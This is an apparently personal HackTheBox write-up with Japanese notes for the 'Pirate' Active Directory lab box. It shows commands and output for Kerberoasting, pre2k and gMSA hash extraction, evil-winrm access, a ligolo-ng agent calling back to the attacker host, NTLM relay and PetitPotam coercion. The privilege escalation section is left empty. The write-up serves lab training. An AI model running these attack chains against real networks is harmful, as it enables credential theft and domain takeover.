---
title: Pirate
parent: HTB
grand_parent: Writeups
---
As is common in real life pentests, you will start the Pirate box with credentials for the following account pentest / p3nt3st2025!&



---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 10.129.244.95  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 20:18 +0900
Nmap scan report for 10.129.244.95
Host is up (0.26s latency).
Not shown: 65511 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49694/tcp open  unknown
49695/tcp open  unknown
49919/tcp open  unknown
49940/tcp open  unknown
49969/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 504.62 seconds
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ cat /etc/hosts | grep pirate                                                        
10.129.244.95 pirate.htb
10.129.244.95 dc01.pirate.htb
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ nxc smb 10.129.244.95 -u pirate.htb\\pentest -p 'p3nt3st2025!&'
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ sudo impacket-GetUserSPNs -request -dc-ip 10.129.244.95 pirate.htb/pentest
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name         MemberOf                         PasswordLastSet             LastLogon                   Delegation  
--------------------  -----------  -------------------------------  --------------------------  --------------------------  -----------
ADFS/a.white          a.white_adm  CN=IT,CN=Users,DC=pirate,DC=htb  2026-01-16 09:36:34.388000  2025-06-10 01:03:37.380258  constrained 



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

*時刻ズレによりハッシュを取得できないためdc01に同期する*

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ sudo systemctl stop systemd-timesyncd
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ sudo ntpdate -u dc01.pirate.htb
2026-06-08 04:22:19.931682 (+0900) +25200.010428 +/- 0.130545 dc01.pirate.htb 10.129.244.95 s1 no-leap
CLOCK: time stepped by 25200.010428
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ date
Mon Jun  8 04:22:27 AM JST 2026
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ impacket-GetUserSPNs -request -dc-ip 10.129.244.95 pirate.htb/pentest 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name         MemberOf                         PasswordLastSet             LastLogon                   Delegation  
--------------------  -----------  -------------------------------  --------------------------  --------------------------  -----------
ADFS/a.white          a.white_adm  CN=IT,CN=Users,DC=pirate,DC=htb  2026-01-16 09:36:34.388000  2025-06-10 01:03:37.380258  constrained 



[-] CCache file is not found. Skipping...
$krb5tgs$23$*a.white_adm$PIRATE.HTB$pirate.htb/a.white_adm*$f42ea6aa5ad72ced18b1959e512242eb$ad3579ef01a7ae0a8e856718612ad809c51c3d54002f43672ff83f74c2fb69ca606c2cc417e0f36cf5be24911670807b91ec312b826b87bc371b494347b86cefeb241298c4e960e4af145ab2fcf5442342b9f36045030fba68d773cbb45113e3252245a3eeade3b8dd1f9b84287febe1f860998759ffe41ad660e1c10209072fc7e8a3ae84368d239bb81f7146797bc93ce98412dcad7a0d9935961ba85874ea24fee7a6b1ec5c1c97505b22feb10cb58d195ada79595c6f22c3c32656c3ddb63e574766baef7f5d9ea29833e4aff2476fbda7b628aa1ad7e1f7f7e2fcf549e3ec4e8e585c7ddfb8c39485d02fb5d165143aba6794be3d9a3901f377a13120e2d1d4537ecc7f9916afa756cbc5612d43453a0650f251abc35afdefd57b815aca4292bf9506a1bb78a286299d25c8abd7a0f862b0d3fad6cc0e2b3d4aa0f26f5f23f9d22ab5ac604bc4e1b475bd2660666fc715a750b77974e32ba63ec14304a76e881bdcc0c8c3a21f31a4e18dcadb0c9e43f963224248f2e092b40aaefc57aec2f88ad2e5ee94e6a39a7f56e430ac583328af2bcad63df0ec203ee2ddfc9dfb2d3c76976db53e164769a95d43a9b2f8e22666ac364ce98f64ee22be69f4b7f56e5c199d24226cde74f53c7804af8d40f6e08bf316d615d8805dd0961259ccecbffc5bb71d4b4d42745c5b27e093d5ad1aef653713dee26b982ee6ab246d4bd41a11966ae8812e3cd69ad4d747bdad6651f2e639c2f11ae43e05651d595ea517c91758bc81f5a9dbbabf31b792737a012b979688a4b6f5a38d390fa1d27270fc254c82b906dafdba51a1aa15c7b9d7535528b015bac00479c1b4bb19cbbff1822aa423abf84c9084e04ab006ac63323d0527f4b327a8ecce374eb662db038114c4a196219c9dc9bce0363a0606a874891ffa8888a4b9efad2184990635ca46638386dc612c11cc863e73b004bc5bc294ed7c9ddd1b65d3f14363076153bb0860a5d33834d084fb412cbba56cd2644f983671af1d292b6b2eae6586e8200ea2e4a1631f7d1edd75643f85cfbdfbb3b0db248edda1f76b5eeb3595d494eb05df817f2485fcaee3f37d10fb52fd204cfe1dcbeb83eeda92c54a1e7d0417e84c2f310cd337e910f3c9d18623d3773343ee17d59b04854c6085fae6d68bc3fc3b82198c166bf1eaed333de9f7b61dc00160d57e3566e47a1f0c4de3a2b915acbd46732358e5a896a28ec59f4ddde3048de5abd3fc7a1efb4e6655c0f77022399dc62445c2a56f3e053c9d20489cb939785da977099e682098e0e6219b36bb35baf5df6c877af69287d42445561f39a58d6c811c1f30a20acf4aceccd962750035fb4c1807bc7957e37bedf3478c96443f6eac09090852e742c23433d9284993d63d7cf7655d3be4f47719c57a793165b7e7502e85e9a7b1cf04113b111b98508350f4a9d9fb673242da1e2d68
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ vim a.white.hash
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ cat -A a.white.hash
$krb5tgs$23$*a.white_adm$PIRATE.HTB$pirate.htb/a.white_adm*$f42ea6aa5ad72ced18b1959e512242eb$ad3579ef01a7ae0a8e856718612ad809c51c3d54002f43672ff83f74c2fb69ca606c2cc417e0f36cf5be24911670807b91ec312b826b87bc371b494347b86cefeb241298c4e960e4af145ab2fcf5442342b9f36045030fba68d773cbb45113e3252245a3eeade3b8dd1f9b84287febe1f860998759ffe41ad660e1c10209072fc7e8a3ae84368d239bb81f7146797bc93ce98412dcad7a0d9935961ba85874ea24fee7a6b1ec5c1c97505b22feb10cb58d195ada79595c6f22c3c32656c3ddb63e574766baef7f5d9ea29833e4aff2476fbda7b628aa1ad7e1f7f7e2fcf549e3ec4e8e585c7ddfb8c39485d02fb5d165143aba6794be3d9a3901f377a13120e2d1d4537ecc7f9916afa756cbc5612d43453a0650f251abc35afdefd57b815aca4292bf9506a1bb78a286299d25c8abd7a0f862b0d3fad6cc0e2b3d4aa0f26f5f23f9d22ab5ac604bc4e1b475bd2660666fc715a750b77974e32ba63ec14304a76e881bdcc0c8c3a21f31a4e18dcadb0c9e43f963224248f2e092b40aaefc57aec2f88ad2e5ee94e6a39a7f56e430ac583328af2bcad63df0ec203ee2ddfc9dfb2d3c76976db53e164769a95d43a9b2f8e22666ac364ce98f64ee22be69f4b7f56e5c199d24226cde74f53c7804af8d40f6e08bf316d615d8805dd0961259ccecbffc5bb71d4b4d42745c5b27e093d5ad1aef653713dee26b982ee6ab246d4bd41a11966ae8812e3cd69ad4d747bdad6651f2e639c2f11ae43e05651d595ea517c91758bc81f5a9dbbabf31b792737a012b979688a4b6f5a38d390fa1d27270fc254c82b906dafdba51a1aa15c7b9d7535528b015bac00479c1b4bb19cbbff1822aa423abf84c9084e04ab006ac63323d0527f4b327a8ecce374eb662db038114c4a196219c9dc9bce0363a0606a874891ffa8888a4b9efad2184990635ca46638386dc612c11cc863e73b004bc5bc294ed7c9ddd1b65d3f14363076153bb0860a5d33834d084fb412cbba56cd2644f983671af1d292b6b2eae6586e8200ea2e4a1631f7d1edd75643f85cfbdfbb3b0db248edda1f76b5eeb3595d494eb05df817f2485fcaee3f37d10fb52fd204cfe1dcbeb83eeda92c54a1e7d0417e84c2f310cd337e910f3c9d18623d3773343ee17d59b04854c6085fae6d68bc3fc3b82198c166bf1eaed333de9f7b61dc00160d57e3566e47a1f0c4de3a2b915acbd46732358e5a896a28ec59f4ddde3048de5abd3fc7a1efb4e6655c0f77022399dc62445c2a56f3e053c9d20489cb939785da977099e682098e0e6219b36bb35baf5df6c877af69287d42445561f39a58d6c811c1f30a20acf4aceccd962750035fb4c1807bc7957e37bedf3478c96443f6eac09090852e742c23433d9284993d63d7cf7655d3be4f47719c57a793165b7e7502e85e9a7b1cf04113b111b98508350f4a9d9fb673242da1e2d68$
```
*hashcatで解析できず*


```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ bloodhound-python -u "pentest" -p 'p3nt3st2025!&' -d pirate.htb -c all --zip -ns 10.129.244.95
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: pirate.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.pirate.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 4 computers
INFO: Connecting to LDAP server: dc01.pirate.htb
INFO: Connecting to GC LDAP server: dc01.pirate.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: WEB01.pirate.htb
INFO: Querying computer: DC01.pirate.htb
INFO: Done in 01M 02S
INFO: Compressing output into 20260608043833_bloodhound.zip
```

![](../../../../assets/images/Pasted%20image%2020260608044640.png)

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ nxc ldap 10.129.244.95 \
-u pentest \
-p 'p3nt3st2025!&' \
-M pre2k
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
PRE2K       10.129.244.95   389    DC01             Pre-created computer account: MS01$
PRE2K       10.129.244.95   389    DC01             Pre-created computer account: EXCH01$
PRE2K       10.129.244.95   389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb
PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb
PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/ccache
```

![](../../../../assets/images/Pasted%20image%2020260608051604.png)

![](../../../../assets/images/Pasted%20image%2020260608052212.png)

MS01$ になって LDAP を見る

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ ls -la ~/.nxc/modules/pre2k/ccache
total 16
drwxrwxr-x 2 kali kali 4096 Jun  8 05:13 .
drwxrwxr-x 4 kali kali 4096 Jun  8 05:13 ..
-rw-rw-r-- 1 kali kali 1340 Jun  8 05:13 exch01.ccache
-rw-rw-r-- 1 kali kali 1326 Jun  8 05:13 ms01.ccache
```


```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ export KRB5CCNAME=~/.nxc/modules/pre2k/ccache/ms01.ccache
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ nxc ldap pirate.htb -k --use-kcache --gmsa

LDAP        pirate.htb      389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PIRATE.HTB) (signing:None) (channel binding:Never) 
LDAP        pirate.htb      389    DC01             [+] PIRATE.HTB\ms01 from ccache 
LDAP        pirate.htb      389    DC01             [*] Getting GMSA Passwords
LDAP        pirate.htb      389    DC01             Account: gMSA_ADCS_prod$      NTLM: 55d78485f8d9b2d2b37628227ebf936a     PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAP        pirate.htb      389    DC01             Account: gMSA_ADFS_prod$      NTLM: abad63faa669b6a4eddfd46432f7ca6c     PrincipalsAllowedToReadPassword: Domain Secure Servers
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ nxc winrm pirate.htb -u gMSA_ADCS_prod$ -H 55d78485f8d9b2d2b37628227ebf936a
WINRM       10.129.244.95   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) 
WINRM       10.129.244.95   5985   DC01             [+] pirate.htb\gMSA_ADCS_prod$:55d78485f8d9b2d2b37628227ebf936a (Pwn3d!)
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ evil-winrm -i pirate.htb -u gMSA_ADCS_prod$ -H '55d78485f8d9b2d2b37628227ebf936a'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> 
```


```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ nxc ldap 10.129.244.95 \
-u '' \
-p '' \
-k \
--use-kcache \
-M maq
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PIRATE.HTB) (signing:None) (channel binding:Never) 
LDAP        10.129.244.95   389    DC01             [+] PIRATE.HTB\ms01 from ccache 
MAQ         10.129.244.95   389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.129.244.95   389    DC01             MachineAccountQuota: 10
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ impacket-getTGT pirate.htb/ms01
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in ms01.ccache
```


---

# Initial Access

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ evil-winrm -i pirate.htb -u gMSA_ADCS_prod$ -H '55d78485f8d9b2d2b37628227ebf936a'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> 
```

```zsh
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.244.95
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
[sudo] password for kali: 
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ ./proxy -selfcert

INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0002] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0002] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0002] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.3

ligolo-ng »  
```

```zsh
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> ./agent.exe -connect 10.10.14.255:11601 -ignore-cert
agent.exe : time="2026-06-07T14:40:30-07:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-06-0...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-06-07T14:40:30-07:00" level=info msg="Connection established" addr="10.10.14.255:11601"
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ sudo ip route add 192.168.100.0/24 dev ligolo
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ impacket-ntlmrelayx -t ldaps://dc01.pirate.htb \
  --delegate-access --escalate-user 'MS01$' --no-smb-server -smb2support
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

```zsh
┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
└─$ python3 ~/Tools/PrivEsc/AD/Enum/PetitPotam/PetitPotam.py 10.10.14.255 web01.pirate.htb -u 'gMSA_ADCS_prod$' -hashes :55d78485f8d9b2d2b37628227ebf936a
/home/kali/Tools/PrivEsc/AD/Enum/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:web01.pirate.htb[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

```zsh

```
---

# Privilege Escalation

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh

```

</details>